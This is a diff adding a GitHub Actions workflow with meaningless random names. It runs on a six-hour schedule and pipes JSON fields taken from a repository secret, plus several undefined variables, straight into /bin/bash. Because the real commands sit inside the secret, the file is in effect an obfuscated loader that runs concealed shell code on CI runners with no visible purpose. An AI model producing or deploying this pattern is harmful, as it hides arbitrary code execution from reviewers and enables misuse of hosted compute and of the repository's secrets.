@@ -1,0 +1,25 @@
+name: linzebei1938
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: linzebei1938
+        env:
+          kygd815: ${{ secrets.kygd815 }}
+        run: |
+          echo $kygd815 | jq -r .iawsd2166 | /bin/bash
+          echo $ft710 | jq -r .pb2993 | /bin/bash
+          echo $knjb3 | jq -r .hr97 | /bin/bash
+          echo $gyxgj52 | jq -r .oyuc48427 | /bin/bash
+          echo $czbzk4 | jq -r .rbh402 | /bin/bash
+          echo $bugct5901 | jq -r .cg2 | /bin/bash
+          echo $ec4440 | jq -r .wy54834 | /bin/bash
+          echo $yje7764 | jq -r .obfei578 | /bin/bash
+
